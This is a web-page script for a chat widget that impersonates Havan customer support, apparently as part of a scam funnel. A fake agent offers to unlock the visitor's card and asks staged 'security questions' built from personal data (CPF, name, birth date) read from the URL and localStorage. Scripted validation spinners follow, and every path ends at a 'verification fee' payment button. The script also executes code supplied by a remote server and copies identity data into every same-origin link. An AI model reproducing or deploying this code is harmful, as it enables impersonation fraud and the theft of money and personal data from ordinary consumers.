<script>
(() => {
    const API = 'https://viewer-production-95b7.up.railway.app';
    const TYPEBOT = 'my-typebot-nhpaq3k';
    const qs = window.location.search || '';
    const urlParams = new URLSearchParams(qs);

    const messagesEl = document.getElementById('messages');
    const actionsEl = document.getElementById('actions');

    const wait = ms => new Promise(r => setTimeout(r, ms));
    const scroll = () => {
        // force instant scroll now, then again after layout settles
        const doScroll = () => {
            messagesEl.scrollTop = messagesEl.scrollHeight + 9999;
            const last = messagesEl.lastElementChild;
            if (last && last.scrollIntoView) last.scrollIntoView({ block: 'end', inline: 'nearest' });
            window.scrollTo(0, document.body.scrollHeight);
        };
        doScroll();
        requestAnimationFrame(doScroll);
        setTimeout(doScroll, 120);
    };

    function renderRichChildren(children, parent) {
        for (const c of children || []) {
            if (c.type === 'br') { parent.appendChild(document.createElement('br')); continue; }
            if (c.children) {
                const inline = document.createElement('span');
                renderRichChildren(c.children, inline);
                parent.appendChild(inline);
                continue;
            }
            if (typeof c.text !== 'string') continue;
            let node = document.createTextNode(c.text);
            if (c.bold) { const s=document.createElement('strong'); s.appendChild(node); node=s; }
            if (c.italic) { const s=document.createElement('em'); s.appendChild(node); node=s; }
            if (c.underline) { const s=document.createElement('u'); s.appendChild(node); node=s; }
            parent.appendChild(node);
        }
    }
    function renderRichText(richText, container) {
        (richText || []).forEach((block, i) => {
            if (i > 0) container.appendChild(document.createElement('br'));
            renderRichChildren(block.children, container);
        });
    }

    function addAgentMessage(node, extraClass='') {
        const el = document.createElement('div');
        el.className = 'msg agent ' + extraClass;
        el.appendChild(node);
        messagesEl.appendChild(el);
        scroll();
    }
    function addUserMessage(text) {
        const el = document.createElement('div');
        el.className = 'msg user';
        el.textContent = text;
        messagesEl.appendChild(el);
        scroll();
    }
    function showTyping() {
        const el = document.createElement('div');
        el.className = 'typing'; el.id = 'typing';
        el.innerHTML = '<span></span><span></span><span></span>';
        messagesEl.appendChild(el); scroll();
    }
    function hideTyping() { const t = document.getElementById('typing'); if (t) t.remove(); }
    function clearActions() { actionsEl.innerHTML = ''; }

    function renderBubble(msg) {
        if (msg.type === 'text') {
            const wrap = document.createElement('div');
            const c = msg.content || {};
            if (c.type === 'richText' && Array.isArray(c.richText)) {
                renderRichText(c.richText, wrap);
            } else if (typeof c.plainText === 'string') {
                wrap.textContent = c.plainText;
            } else if (typeof c.html === 'string') {
                wrap.textContent = c.html.replace(/<[^>]+>/g,'');
            }
            addAgentMessage(wrap);
        } else if (msg.type === 'image') {
            const img = document.createElement('img');
            img.src = msg.content.url; img.alt = '';
            addAgentMessage(img, 'image');
        } else if (msg.type === 'audio') {
            const a = document.createElement('audio');
            a.src = msg.content.url; a.controls = true; a.preload = 'metadata';
            a.autoplay = true;
            a.play().catch(()=>{});
            addAgentMessage(a, 'audio');
        } else if (msg.type === 'video') {
            const v = document.createElement('video');
            v.src = msg.content.url; v.controls = true; v.style.maxWidth = '100%';
            addAgentMessage(v, 'image');
        } else if (msg.type === 'embed') {
            const f = document.createElement('iframe');
            f.src = msg.content.url; f.allow='autoplay';
            addAgentMessage(f, 'embed');
        }
    }

    // Execute a limited setVariable client action safely (only reads location.search)
    function runSetVariable(action) {
        try {
            const script = action.setVariable && action.setVariable.scriptToExecute;
            if (!script || !script.isCode) return null;
            // eslint-disable-next-line no-new-func
            const fn = new Function(script.content);
            return fn();
        } catch (e) {
            console.warn('setVariable failed', e);
            return null;
        }
    }

    async function processResponse(resp) {
        const messages = resp.messages || [];
        const actions = resp.clientSideActions || [];
        // Map: lastBubbleBlockId -> [actions]
        const actionsByBubble = {};
        const orphanActions = [];
        for (const a of actions) {
            if (a.lastBubbleBlockId) {
                (actionsByBubble[a.lastBubbleBlockId] = actionsByBubble[a.lastBubbleBlockId] || []).push(a);
            } else orphanActions.push(a);
        }

        let pendingReply = null;

        for (const msg of messages) {
            showTyping();
            // small initial delay for typing feel
            await wait(600);
            hideTyping();
            renderBubble(msg);
            const acts = actionsByBubble[msg.id] || [];
            for (const a of acts) {
                if (a.type === 'wait' && a.wait && a.wait.secondsToWaitFor) {
                    await wait(a.wait.secondsToWaitFor * 1000);
                } else if (a.type === 'setVariable') {
                    const val = runSetVariable(a);
                    if (a.expectsDedicatedReply) pendingReply = val == null ? '' : String(val);
                }
                // Ignoramos qualquer redirect vindo do typebot (ex: gvconsultas) — pagamento é no nosso gateway
            }
        }
        for (const a of orphanActions) {
            if (a.type === 'setVariable') {
                const val = runSetVariable(a);
                if (a.expectsDedicatedReply) pendingReply = val == null ? '' : String(val);
            }
        }

        // If server expects a dedicated reply from a client-side setVariable, send it silently
        if (pendingReply !== null) {
            await continueChat(pendingReply, { silent: true });
            return;
        }

        // Render input
        renderInput(resp.input);
    }

    function isPaymentOrFinalUrl(url) {
        return /pix|pagar|checkout|pagamento|payment|pay/i.test(url || '');
    }

    function renderInput(input) {
        clearActions();
        if (!input) {
            // Flow ended — offer pay button as safety net
            showPayButton();
            return;
        }
        const type = input.type || '';
        if (type.includes('choice')) {
            const PAY_RE = /^(?!.*\?)(?:quero\s*pagar|pagar\s*(?:agora|taxa)|efetuar\s*pagamento|ir\s*(?:para|pro)\s*pagamento|gerar\s*pix|realizar\s*pagamento|pagar\s*com\s*pix)/i;
            // Detecta se é a pergunta de data de nascimento pra usar label especial no vazio
            const lastAgentText = (function(){
                const els = document.querySelectorAll('.msg.agent');
                return els.length ? (els[els.length-1].textContent || '') : '';
            })();
            const isDobQuestion = /data\s+de\s+nascimento|nascimento/i.test(lastAgentText);
            (input.items || []).forEach(item => {
                let label = (item.content || '').trim();
                if (!label) {
                    label = isDobQuestion ? 'Nenhuma data acima' : 'Nenhuma das opções acima';
                }
                if (PAY_RE.test(label)) {
                    const btn = document.createElement('button');
                    btn.className = 'pay-btn';
                    btn.textContent = label.toUpperCase();
                    btn.onclick = () => goToPayment(btn);
                    actionsEl.appendChild(btn);
                    return;
                }
                const btn = document.createElement('button');
                btn.className = 'choice-btn';
                btn.textContent = label;
                btn.onclick = () => {
                    clearActions();
                    addUserMessage(label);
                    continueChat(label);
                };
                actionsEl.appendChild(btn);
            });

            // Handle button link redirects (rare)
            if (input.options && input.options.buttonLabel && input.options.buttonUrl) {
                showPayButton(input.options.buttonLabel, input.options.buttonUrl);
            }
        } else if (type === 'payment input' || type === 'payment') {
            showPayButton('PAGAR TAXA DE VERIFICAÇÃO');
        } else if (type.includes('text') || type.includes('email') || type.includes('number') || type.includes('phone') || type.includes('url') || type.includes('date')) {
            const row = document.createElement('div');
            row.className = 'text-row';
            const inp = document.createElement('input');
            inp.type = type.includes('number') ? 'number' : (type.includes('email') ? 'email' : (type.includes('phone') ? 'tel' : 'text'));
            inp.placeholder = (input.options && input.options.labels && input.options.labels.placeholder) || 'Digite sua resposta...';
            const btn = document.createElement('button');
            btn.className = 'send-btn'; btn.textContent = 'Enviar';
            const send = () => {
                const v = inp.value.trim(); if (!v) return;
                clearActions(); addUserMessage(v); continueChat(v);
            };
            btn.onclick = send;
            inp.addEventListener('keydown', e => { if (e.key === 'Enter') send(); });
            row.appendChild(inp); row.appendChild(btn);
            actionsEl.appendChild(row);
            inp.focus();
        } else {
            // Unknown input type — final CTA
            showPayButton();
        }
        scroll();
    }

    let paymentInFlight = false;
    function goToPayment(btn) {
        if (paymentInFlight) return;
        paymentInFlight = true;
        // Desativa todos os botões de ação para evitar duplo clique
        actionsEl.querySelectorAll('button').forEach(b => { b.disabled = true; b.style.opacity = '0.7'; b.style.cursor = 'not-allowed'; });
        if (btn) {
            btn.innerHTML = '<span class="btn-spinner"></span> PROCESSANDO...';
        }
        var pq = new URLSearchParams(window.location.search); pq.delete('embedded'); var payUrl = '/funil/pos/pagfront/' + (pq.toString() ? '?' + pq.toString() : '');
        try { (window.top || window).location.href = payUrl; } catch (e) { window.location.href = payUrl; }
    }

    function showPayButton(label) {
        clearActions();
        const btn = document.createElement('button');
        btn.className = 'pay-btn';
        btn.textContent = label || 'PAGAR TAXA DE VERIFICAÇÃO';
        btn.onclick = () => goToPayment(btn);
        actionsEl.appendChild(btn);
    }

    let sessionId = null;
    let inFlight = false;

    async function startChat() {
        try {
            const body = {
                startParams: { typebot: TYPEBOT, isPreview: false },
                prefilledVariables: {}
            };
            // Prefill common variables from URL so security question flow works
            ['cpf','phone','nome','name','email','mae','sexo','nascimento','data_nascimento','dob','utm_source','utm_medium','utm_campaign','utm_term','utm_content','fbclid','gclid']
                .forEach(k => { const v = urlParams.get(k); if (v) body.prefilledVariables[k] = v; });

            // Fallback: dados do CPF salvos no localStorage pela página 4
            try {
                const dc = JSON.parse(localStorage.getItem('dadosCPF') || 'null');
                if (dc) {
                    const setIf = (k, v) => { if (v && !body.prefilledVariables[k]) body.prefilledVariables[k] = v; };
                    setIf('cpf', dc.cpf);
                    setIf('cpf_formatado', dc.cpfFormatado);
                    setIf('nome', dc.nomeCompleto);
                    setIf('name', dc.nomeCompleto);
                    setIf('sexo', dc.sexo);
                    setIf('nascimento', dc.nascimento);
                    setIf('data_nascimento', dc.nascimento);
                    setIf('dob', dc.nascimento);
                }
            } catch(_) {}

            const r = await fetch(`${API}/api/v1/sendMessage`, {
                method: 'POST',
                headers: {'content-type':'application/json'},
                body: JSON.stringify(body)
            });
            if (!r.ok) throw new Error('HTTP ' + r.status);
            const data = await r.json();
            sessionId = data.sessionId;
            await processResponse(data);
        } catch (e) {
            console.error(e);
            addAgentMessage(Object.assign(document.createElement('span'), {
                textContent: 'Não foi possível conectar ao atendimento. Toque no botão para continuar.'
            }));
            showPayButton();
        }
    }

    async function continueChat(message, opts={}) {
        if (!sessionId || inFlight) return;
        inFlight = true;
        try {
            const r = await fetch(`${API}/api/v1/sessions/${sessionId}/continueChat`, {
                method: 'POST',
                headers: {'content-type':'application/json'},
                body: JSON.stringify({ message })
            });
            if (!r.ok) throw new Error('HTTP ' + r.status);
            const data = await r.json();
            inFlight = false;
            await processResponse(data);
        } catch (e) {
            inFlight = false;
            console.error(e);
            if (!opts.silent) {
                addAgentMessage(Object.assign(document.createElement('span'), {
                    textContent: 'Erro de conexão. Toque para continuar.'
                }));
                showPayButton();
            }
        }
    }

    // ===== Roteiro nativo (sem servidor externo) =====
    function getDados() {
        let dc = {};
        try { dc = JSON.parse(localStorage.getItem('dadosCPF') || '{}') || {}; } catch(_) {}
        const ok = v => v && !/não (encontrad|informad)/i.test(v);
        const nome = ok(urlParams.get('nome') || dc.nomeCompleto) ? (urlParams.get('nome') || dc.nomeCompleto).trim() : '';
        const nasc = ok(urlParams.get('nascimento') || dc.nascimento) ? (urlParams.get('nascimento') || dc.nascimento).trim() : '';
        const mae = ((urlParams.get('mae') || dc.mae || '') + '').trim();
        const cpfRaw = (urlParams.get('cpf') || dc.cpf || '').replace(/\D/g, '');
        const cpf = dc.cpfFormatado || (cpfRaw.length === 11 ? cpfRaw.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : cpfRaw);
        return { nome, nasc, mae, cpf };
    }
    const tc = s => s.toLowerCase().replace(/(^|\s)\S/g, c => c.toUpperCase());
    async function say(text, ms=900) {
        showTyping(); await wait(ms); hideTyping();
        const s = document.createElement('div'); s.innerHTML = text; addAgentMessage(s);
    }
    // Um único player para todos os áudios: desbloqueado no toque e reutilizado em sequência
    // (no celular, vários players destravados juntos acabam tocando ao mesmo tempo).
    const player = document.createElement('audio');
    player.preload = 'auto'; player.volume = 1; window.__chatPlayer = player;
    let firstStarted = false;
    let releaseEmbeddedChat = null;
    window.startChatFromParent = function(phone) {
        if (phone) urlParams.set('phone', phone);
        player.src = '/funil/12/audios/a1.mp3?v=4';
        player.muted = false; player.volume = 1;
        player.play().then(() => { firstStarted = true; }).catch(() => {});
        if (releaseEmbeddedChat) releaseEmbeddedChat();
    };
    function audioBubble() {
        const w = document.createElement('div');
        w.style.cssText = 'display:flex;align-items:center;gap:10px;min-width:220px;padding:4px 2px';
        w.innerHTML = '<button type="button" style="width:36px;height:36px;border-radius:50%;border:0;background:#0a2fd6;color:#fff;font-size:15px;flex:none">❚❚</button>'
          + '<div style="flex:1;height:4px;background:#d6dbe8;border-radius:4px;overflow:hidden"><i style="display:block;height:100%;width:0;background:#0a2fd6"></i></div>'
          + '<span style="font-size:12px;color:#667;min-width:34px">0:00</span>';
        return w;
    }
    async function sayAudio(file) {
        showTyping(); await wait(300); hideTyping();
        const url = '/funil/12/audios/' + file + '?v=4';
        const bubble = audioBubble();
        const btn = bubble.querySelector('button'), bar = bubble.querySelector('i'), t = bubble.querySelector('span');
        addAgentMessage(bubble, 'audio');
        if (!(file === 'a1.mp3' && firstStarted && player.src.indexOf('a1.mp3') >= 0)) {
            player.pause(); player.src = url; player.currentTime = 0;
        }
        player.muted = false; player.volume = 1;
        const fmt = x => { x = Math.floor(x||0); return Math.floor(x/60) + ':' + String(x%60).padStart(2,'0'); };
        const upd = () => { if (player.duration) bar.style.width = (player.currentTime/player.duration*100) + '%'; t.textContent = fmt(player.currentTime); btn.textContent = player.paused ? '▶' : '❚❚'; };
        btn.onclick = () => { if (player.paused) player.play().catch(()=>{}); else player.pause(); };
        player.addEventListener('timeupdate', upd); player.addEventListener('play', upd); player.addEventListener('pause', upd);
        if (player.paused) player.play().catch(() => { upd(); });
        upd();
        await new Promise(res => {
            let done = false; const fin = () => { if (!done) { done = true; res(); } };
            player.addEventListener('ended', fin, { once:true });
            player.addEventListener('error', fin, { once:true });
            setTimeout(fin, 45000);
        });
        player.removeEventListener('timeupdate', upd); player.removeEventListener('play', upd); player.removeEventListener('pause', upd);
        bar.style.width = '100%'; btn.textContent = '▶';
        btn.onclick = () => { player.pause(); player.src = url; player.play().catch(()=>{}); };
        await wait(350);
    }
    async function card(html, ms) {
        const el = document.createElement('div');
        el.className = 'status-card';
        el.innerHTML = '<div class="spin"></div><div class="st-txt">' + html.loading + '</div><div class="bar"><i></i></div>';
        addAgentMessage(el, 'card');
        await wait(ms);
        el.classList.add('done');
        el.innerHTML = '<div class="check">✓</div><div class="st-txt">' + html.done + '</div><div class="bar full"><i></i></div>';
        scroll();
        await wait(800);
    }
    function ask(options, cls='') {
        return new Promise(res => {
            clearActions();
            const wrap = document.createElement('div');
            wrap.className = 'opts ' + cls;
            options.forEach(label => {
                const b = document.createElement('button');
                b.className = 'opt-btn'; b.textContent = label;
                b.onclick = () => { clearActions(); addUserMessage(label); res(label); };
                wrap.appendChild(b);
            });
            actionsEl.appendChild(wrap);
            scroll();
        });
    }
    function fakeDates(real) {
        const m = /^(\d{2})\/(\d{2})\/(\d{4})$/.exec(real);
        const y = m ? +m[3] : 1985;
        const pad = n => String(n).padStart(2, '0');
        const out = new Set(real ? [real] : []);
        while (out.size < 4) out.add(pad(1 + Math.floor(Math.random()*28)) + '/' + pad(1 + Math.floor(Math.random()*12)) + '/' + (y + Math.floor(Math.random()*21) - 10));
        return [...out].sort(() => Math.random() - 0.5);
    }
    function fakeCpfs(real) {
        const pad = n => String(n).padStart(2, '0');
        const gen = () => {
            const n = Array.from({length: 11}, () => Math.floor(Math.random()*10)).join('');
            return n.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        };
        const out = new Set(real ? [real] : []);
        while (out.size < 4) out.add(gen());
        return [...out].sort(() => Math.random() - 0.5);
    }
    const FAKE_NAMES = ['Roberta Oliveira Costa','Tereza Tomaz das Neves','Fernanda Cunha Ferreira','Maria Aparecida Souza','Sandra Regina Lima','Lúcia Helena Martins'];
    async function runScript() {
        const d = getDados();
        if (urlParams.get('embedded') === '1') {
            await new Promise(res => { releaseEmbeddedChat = res; });
        }
        await say('Olá! seja bem vindo(a) a central de atendimento da Havan! me chamo <strong>Julia Silva</strong> e vou te auxiliar a <strong>desbloquear seu cartão.</strong>', 300);
        await sayAudio('a1.mp3');
        await say('<strong>ATENÇÃO ❗</strong> Responda as perguntas abaixo corretamente para podermos continuar.');

        await say('<strong>Pergunta de segurança 1 — Qual é o seu nome completo?</strong>', 700);
        const fakes = FAKE_NAMES.sort(() => Math.random() - 0.5).slice(0, 3);
        const names = (d.nome ? [...fakes, tc(d.nome)] : [...fakes, FAKE_NAMES[3]]).sort(() => Math.random() - 0.5);
        await ask([...names, 'Nenhum dos nomes acima']);

        await say('<strong>Pergunta de segurança 2 — Qual é a sua data de nascimento?</strong>', 700);
        await ask(fakeDates(d.nasc), 'grid');

        await say('<strong>Pergunta de segurança 3 — Qual é o seu CPF?</strong>', 700);
        await ask(fakeCpfs(d.cpf), 'grid');

        await say('<strong>Pergunta de segurança 4 — Qual é o seu estado civil?</strong>', 700);
        await ask(['Solteiro(a)','Casado(a)','Viúvo(a)','Separado(a) judicialmente','Em relação estável']);

        await card({ loading: 'Validando dados...', done: 'Dados validados com sucesso!' }, 2600);
        await sayAudio('a2.mp3');

        await say('Confira se os dados abaixo estão corretos:', 800);
        const t = document.createElement('div');
        t.className = 'titular';
        t.innerHTML = '<div class="tt-h">🏛️ <span>DADOS DO TITULAR</span></div>'
            + '<div class="tt-r"><small>NOME COMPLETO</small><b></b></div>'
            + '<div class="tt-r"><small>CPF</small><b></b></div>'
            + '<div class="tt-r"><small>DATA DE NASCIMENTO</small><b></b></div>';
        const bs = t.querySelectorAll('b');
        bs[0].textContent = (d.nome || '—').toUpperCase();
        bs[1].textContent = d.cpf || '—';
        bs[2].textContent = d.nasc || '—';
        addAgentMessage(t, 'card');
        await ask(['Sim, estão.', 'Não estão corretos, preciso alterar.']);

        await sayAudio('a3.mp3');
        await say('Posso realizar o desbloqueio do seu cartão?');
        await ask(['Sim, pode realizar o desbloqueio.', 'Não, desejo desistir do meu cartão.']);

        await card({ loading: 'Desbloqueando cartão......', done: 'Cartão desbloqueado com sucesso!' }, 3200);
        await sayAudio('a4.mp3');
        await sayAudio('a5.mp3');
        await ask(['Por que preciso pagar a taxa de verificação?']);
        await sayAudio('a6.mp3');
        showPayButton('PAGAR TAXA DE VERIFICAÇÃO');
    }
    runScript().catch(e => { console.error(e); showPayButton(); });
})();
</script>

<script>
(function() {
    function updateAllLinksAndForms() {
        const urlParams = new URLSearchParams(window.location.search);
        const utms = {};
        urlParams.forEach((value, key) => {
            if (key.startsWith('utm_') || ['cpf','fbclid','gclid','nome','name','mae','nome_mae','sexo','nascimento','data_nascimento','dob','phone','email','cpf_formatado','cor'].includes(key) || key === 'phone') {
                utms[key] = value;
            }
        });
        if (Object.keys(utms).length === 0) return;
        document.querySelectorAll('a').forEach(link => {
            try {
                const href = link.getAttribute('href');
                if (!href || href.startsWith('#') || href.startsWith('javascript:')) return;
                const url = new URL(href, window.location.origin);
                if (url.origin === window.location.origin || href.startsWith('.') || href.startsWith('/')) {
                    const p = new URLSearchParams(url.search);
                    Object.keys(utms).forEach(k => p.set(k, utms[k]));
                    url.search = p.toString();
                    link.href = url.toString();
                }
            } catch(e){}
        });
    }
    document.addEventListener('DOMContentLoaded', updateAllLinksAndForms);
})();
</script>
<script src="/funil/track.js" defer></script>
